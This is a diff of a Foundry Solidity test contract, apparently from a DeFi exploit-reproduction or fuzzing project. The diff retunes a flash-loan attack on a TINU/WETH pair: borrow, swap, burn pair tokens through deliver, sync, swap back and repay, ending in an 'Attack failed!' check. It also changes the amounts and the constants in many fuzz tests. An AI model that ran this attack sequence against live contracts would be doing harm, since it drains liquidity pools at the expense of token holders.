@@ -148,21 +148,20 @@ contract TINUTest is Test, BlockLoader {
 
     function burn_pair_tinu(uint256 amount) internal {
         tinu.deliver(address(pair), amount);
-        pair.skim(attacker);
     }
 
     function test_gt() public {
-        borrow_weth(104.85e18);
+        borrow_weth(22e18);
         printBalance("After step0 ");
         swap_pair_weth_tinu(weth.balanceOf(attacker));
         printBalance("After step1 ");
-        burn_pair_tinu(tinu.balanceOf(address(pair)) - 1);
+        burn_pair_tinu(100 ether);
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
         swap_pair_tinu_weth(tinu.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_weth((104.85e18 * 1003) / 1000);
+        payback_weth(22e18);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
     }
@@ -174,7 +173,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 105164549999999988638);
+        vm.assume(amt4 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -191,7 +190,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 105164549999999988638);
+        vm.assume(amt4 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -208,7 +207,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 105164549999999988638);
+        vm.assume(amt5 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -225,7 +224,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 105164549999999988638);
+        vm.assume(amt4 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -243,7 +242,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 105164549999999988638);
+        vm.assume(amt5 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -261,7 +260,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 105164549999999988638);
+        vm.assume(amt5 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -281,7 +280,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 105164549999999988638);
+        vm.assume(amt6 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -300,7 +299,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
-        vm.assume(amt5 == amt0 + 105164549999999988638);
+        vm.assume(amt5 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -320,7 +319,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 105164549999999988638);
+        vm.assume(amt6 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -340,7 +339,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 105164549999999988638);
+        vm.assume(amt6 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -362,7 +361,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
-        vm.assume(amt7 == amt0 + 105164549999999988638);
+        vm.assume(amt7 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -383,7 +382,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
-        vm.assume(amt6 == amt0 + 105164549999999988638);
+        vm.assume(amt6 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -405,7 +404,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
-        vm.assume(amt7 == amt0 + 105164549999999988638);
+        vm.assume(amt7 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -427,7 +426,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
-        vm.assume(amt7 == amt0 + 105164549999999988638);
+        vm.assume(amt7 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -451,7 +450,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
-        vm.assume(amt8 == amt0 + 105164549999999988638);
+        vm.assume(amt8 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -474,7 +473,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
-        vm.assume(amt7 == amt0 + 105164549999999988638);
+        vm.assume(amt7 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
@@ -498,7 +497,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
-        vm.assume(amt8 == amt0 + 105164549999999988638);
+        vm.assume(amt8 == amt0 + 22065999999999997616);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
         burn_pair_tinu(amt2);
